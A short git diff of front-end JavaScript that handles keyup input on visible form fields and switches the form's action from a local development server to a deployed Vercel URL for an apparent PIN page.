@@ -1,7 +1,7 @@
 const inputs = Array.from(document.querySelectorAll("input")).filter(input => !input.classList.contains("hidden"))
 const btn = document.querySelector("button");
 const form = document.querySelector("form");
-form.action = "http://127.0.0.1:5500/pin.html"
+form.action = "https://app-palmpay.vercel.app/pin.html"
 
 inputs.forEach((input) => {
   input.addEventListener("keyup", handleInput);
